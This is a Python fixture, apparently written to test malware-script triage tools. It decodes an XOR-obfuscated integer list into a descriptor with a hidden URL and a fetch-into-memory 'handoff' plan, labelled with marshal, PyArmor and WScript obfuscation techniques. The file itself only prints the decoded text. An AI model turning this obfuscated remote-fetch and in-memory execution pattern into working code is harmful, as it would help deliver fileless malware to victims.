# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_9dbe37e9 = [80, 109, 95, 35, 80, 36, 65, 49, 66, 127, 30, 125, 12, 121, 16, 98, 7, 88, 42, 79, 34, 77, 57, 92, 112, 20, 125, 14, 126, 31, 107, 8, 96, 63, 82, 55, 90, 53, 71, 62, 66, 35, 71, 38, 86, 34, 71, 53, 8, 122, 31, 110, 27, 126, 13, 121, 10, 85, 38, 82, 43, 71, 34, 125, 16, 117, 24, 119, 5, 124, 0, 115, 7, 102, 1, 100, 59, 88, 55, 66, 44, 88, 101, 84, 40, 91, 34, 76, 56, 89, 33, 28, 121, 1, 98, 7, 119, 3, 106, 5, 107, 52, 81, 41, 89, 43, 78, 61, 78, 39, 72, 38, 90, 53, 87, 49, 68, 55, 84, 53, 65, 40, 71, 41, 20, 121, 24, 106, 25, 113, 16, 124, 35, 70, 40, 94, 59, 87, 56, 72, 45, 114, 2, 110, 15, 97, 29, 126, 31, 109, 31, 118, 19, 97, 92, 44, 85, 52, 70, 43, 68, 54, 105, 6, 100, 2, 119, 4, 103, 6, 114, 23, 115, 15, 120, 17, 127, 27, 116, 3, 112, 47, 76, 36, 69, 44, 66, 127, 8, 123, 24, 106, 3, 115, 7, 88, 44, 67, 28, 108, 21, 97, 9, 102, 8, 116, 23, 118, 27, 107, 10, 99, 4, 106, 53, 92, 56, 5, 102, 7, 106, 26, 123, 18, 117, 27, 54, 0, 102, 95, 108, 89, 107, 82, 100, 87, 49, 77, 56, 74, 38, 27, 115, 7, 115, 3, 112, 74, 101, 74, 124, 26, 35, 16, 37, 23, 46, 24, 43, 77, 99, 6, 126, 31, 114, 2, 110, 11, 37, 76, 34, 84, 53, 89, 48, 84, 123, 72, 45, 73, 45, 29, 121, 73, 121, 87, 39, 94, 34, 87, 36, 65, 51, 108, 13, 106, 15, 97, 21, 40, 96, 21, 123, 15, 125, 24, 107, 24, 72, 49, 69, 45, 66, 44, 3, 53, 83, 106, 89, 108, 94, 103, 81, 98, 4]
CODEC_9dbe37e9 = "integer_list|rolling_xor|26"

def load_9dbe37e9():
    return bytes(MATERIAL_9dbe37e9)

def decode_9dbe37e9(EnCoDeD_Bytes):
    DeCoDeD_Bytes = bytearray()
    PrEvIoUs = 38
    for value in EnCoDeD_Bytes:
        DeCoDeD_Bytes.append(value ^ PrEvIoUs)
        PrEvIoUs = value
    return bytes(DeCoDeD_Bytes)

def recover_9dbe37e9():
    NeUtRaL = ":".join(("north", "south"))
    try:
        DeCoDeD_Bytes = decode_9dbe37e9(load_9dbe37e9())
    except (TypeError, ValueError) as error:
        raise RuntimeError("configuration recovery failed") from error
    DeScRiPtOr_Text = DeCoDeD_Bytes.decode("ascii", "strict")
    return DeScRiPtOr_Text

def inspect_9dbe37e9():
    return recover_9dbe37e9()

def surface_9dbe37e9():
    try:
        raise LookupError("surface")
    except LookupError:
        return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

def obfuscation_9dbe37e9():
    marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
    return marshal_plan["label"]

def plan_9dbe37e9():
    fields = dict(item.split("=", 1) for item in inspect_9dbe37e9().split("|"))
    analysis_surface = surface_9dbe37e9()
    obfuscation_surface = obfuscation_9dbe37e9()
    operation_plan = ("requests_style_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_9dbe37e9())

# reconstruction complete